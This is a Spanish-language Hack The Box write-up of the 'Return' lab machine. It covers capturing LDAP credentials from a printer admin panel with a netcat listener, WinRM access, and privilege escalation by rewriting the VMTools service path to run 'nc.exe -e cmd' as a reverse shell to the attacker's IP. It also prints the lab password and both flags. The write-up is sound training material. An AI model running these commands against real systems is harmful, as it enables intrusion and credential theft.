---
category: Hack The Box
tags:
  - eJPT
title: Machine Return
comments: "true"
image: /assets/img/machines/Return/Returnbanner.jpeg
---
## Introducción
Return es una máquina de dificultad easy que plantea el caso de una impresora de red vulnerable, a través de la cual es posible obtener acceso al sistema. Durante el proceso de enumeración, se identifica un panel de administración de impresoras que almacena credenciales LDAP en su configuración. Mediante la manipulación de estos parámetros, se logra capturar las credenciales válidas, permitiendo establecer el acceso inicial al sistema a través del servicio WinRM. Posteriormente, se descubre que el usuario comprometido pertenece a un grupo privilegiado, lo que permite realizar una escalada de privilegios efectiva hasta obtener el control total del sistema con permisos de SYSTEM.

## Skills

- Abusing Printer
- LDAP

## Enumeración
Se inició el reconocimiento de la máquina realizando un escaneo completo de puertos. El análisis reveló múltiples servicios accesibles, entre los que destacan los relacionados con un controlador de dominio Active Directory (AD), como los puertos 88 (Kerberos), 389 (LDAP), 636 (LDAPS), 464 (kpasswd5), 3268/3269 (Global Catalog LDAP), así como los puertos clásicos de un sistema Windows como 135 (RPC), 139/445 (SMB) y 5985 (WinRM). La presencia de estos servicios sugiere que estamos ante un servidor Windows con funciones de controlador de dominio. Además, el puerto 80 (HTTP) queda expuesto, indicando la existencia de un servicio web que podría ser un vector inicial de ataque.
```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.108
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Initiating SYN Stealth Scan at 16:20
Scanning 10.10.11.108 [65535 ports]
Discovered open port 445/tcp on 10.10.11.108
Discovered open port 135/tcp on 10.10.11.108
Discovered open port 80/tcp on 10.10.11.108
Discovered open port 53/tcp on 10.10.11.108
Discovered open port 139/tcp on 10.10.11.108
Discovered open port 47001/tcp on 10.10.11.108
Discovered open port 593/tcp on 10.10.11.108
Discovered open port 5985/tcp on 10.10.11.108
Discovered open port 3269/tcp on 10.10.11.108
Discovered open port 389/tcp on 10.10.11.108
Discovered open port 49675/tcp on 10.10.11.108
Discovered open port 49665/tcp on 10.10.11.108
Discovered open port 49664/tcp on 10.10.11.108
Discovered open port 64322/tcp on 10.10.11.108
Discovered open port 49674/tcp on 10.10.11.108
Increasing send delay for 10.10.11.108 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49682/tcp on 10.10.11.108
Discovered open port 49679/tcp on 10.10.11.108
Increasing send delay for 10.10.11.108 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 636/tcp on 10.10.11.108
Discovered open port 9389/tcp on 10.10.11.108
Discovered open port 3268/tcp on 10.10.11.108
Discovered open port 464/tcp on 10.10.11.108
Discovered open port 49667/tcp on 10.10.11.108
Discovered open port 49671/tcp on 10.10.11.108
Discovered open port 88/tcp on 10.10.11.108
Discovered open port 49666/tcp on 10.10.11.108
Discovered open port 49697/tcp on 10.10.11.108
Completed SYN Stealth Scan at 16:22, 70.43s elapsed (65535 total ports)
Nmap scan report for 10.10.11.108
Host is up, received user-set (0.41s latency).
Not shown: 57521 closed tcp ports (reset), 7988 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49682/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
64322/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 70.62 seconds
           Raw packets sent: 339069 (14.919MB) | Rcvd: 90072 (3.603MB)
```

### Análisis del Servicio HTTP
Accediendo al servicio web en el puerto 80, se observa una interfaz gráfica correspondiente a un panel de administración de impresoras de red. Esta interfaz confirma la presencia de un sistema de gestión de impresoras, el cual será clave durante las siguientes etapas de explotación.

![1](/assets/img/machines/Return/1.jpeg)

Dentro de la interfaz web de administración de la impresora, específicamente en la sección Settings, es posible visualizar parámetros clave relacionados con un servidor LDAP. Esta sección revela información crítica para el acceso al sistema

![2](/assets/img/machines/Return/2.jpeg)
Esta configuración sugiere que el panel se comunica directamente con un servidor LDAP mediante el puerto 389, y que utiliza las credenciales del usuario svc-printer para autenticarse. Aunque la contraseña no es visible.

## LDAP
Se configuró un listener en el puerto 389 de la máquina atacante utilizando netcat. Al presionar el botón Update en la sección de configuración de la impresora, el dispositivo intentó establecer conexión con el servidor especificado, enviando las credenciales de autenticación en texto claro. De esta manera se obtuvieron las siguientes credenciales:

```bash
❯ nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.108] 59080
0*`%return\svc-printer�
                       1edFg43012!!
```

### Validación de Credenciales
Una vez obtenidas las credenciales LDAP, se procedió a verificar su validez en otros servicios expuestos en el sistema. Utilizando la herramienta crackmapexec sobre el puerto SMB (445), se confirmó que las credenciales svc-printer:1edFg43012!! son válidas dentro del dominio return.local, lo cual evidencia que la cuenta tiene permisos válidos de autenticación en el sistema operativo:
```bash
❯ crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
```

### Acceso Inicial vía WinRM
Tras validar las credenciales, se intentó el acceso al servicio WinRM (5985), el cual se encontraba habilitado en la máquina objetivo. Utilizando nuevamente crackmapexec, se comprobó que las credenciales svc-printer:1edFg43012!! también permiten autenticarse exitosamente a través de este servicio, obteniendo así un punto de acceso remoto a la máquina:
```bash
❯ crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
HTTP        10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

### Obtención de Shell Remota
Con las credenciales válidas previamente obtenidas, se estableció una conexión interactiva al sistema mediante Evil-WinRM, herramienta que permite interactuar con sistemas Windows a través del servicio WinRM. Una vez conectado, se verificó que la sesión corresponde al usuario comprometido:
```bash
❯ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

### Captura de la Flag de Usuario
Ya dentro de la máquina, se procedió a localizar la primera flag:
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-printer> cd Desktop
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/15/2025  10:08 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
646cf3835a5e5a7b8a0d83e057272362
```

## Escalada de Privilegios
Para facilitar una escalada de privilegios y obtener un shell con permisos elevados, se copió la herramienta nc.exe al directorio local actual de trabajo:
```bash
❯ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
```

Para realizar la escalada de privilegios, se procedió a subir la herramienta nc.exe al escritorio del usuario svc-printer:
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> upload HTB/return/nc.exe
                                        
Info: Uploading /home/alex/HTB/return/nc.exe to C:\Users\svc-printer\Desktop\nc.exe
                                        
Data: 37544 bytes of 37544 bytes copied
                                        
Info: Upload successful!
```

Para conocer los servicios activos en el sistema comprometido, se ejecutó el comando services. Entre los servicios destacados se identificaron:
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc    
```

Se identificó el servicio VMTools ejecutándose con privilegios elevados. Se procedió a detener dicho servicio mediante sc.exe stop VMTools y, una vez detenido, se modificó su ruta de ejecución utilizando sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.16.6 443", de forma que al reiniciarlo ejecutase el binario previamente subido de netcat, el cual establecería una reverse shell hacia el equipo atacante. 
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe stop VMTools 

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.16.6 443"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe start VMTools
```

Mientras tanto, en el equipo atacante se dejó netcat en escucha en el puerto 443 con el comando nc -nlvp 443. Una vez iniciado el servicio modificado en la máquina víctima, se estableció exitosamente una conexión inversa, proporcionando acceso a una consola remota con privilegios elevados.
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.108] 55325
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Captura de la Flag de root
Una vez obtenida la shell privilegiada, se accedió al directorio Desktop del usuario Administrator. revelando así la flag de administrador:
```bash
C:\Windows\system32>cd C:\Users\Administrator\Desktop 
cd C:\Users\Administrator\Desktop 

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E

 Directory of C:\Users\Administrator\Desktop

09/27/2021  04:22 AM    <DIR>          .
09/27/2021  04:22 AM    <DIR>          ..
06/15/2025  10:08 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,778,104,832 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
99678a9d2d505783122c27c1b4dad8bd
```

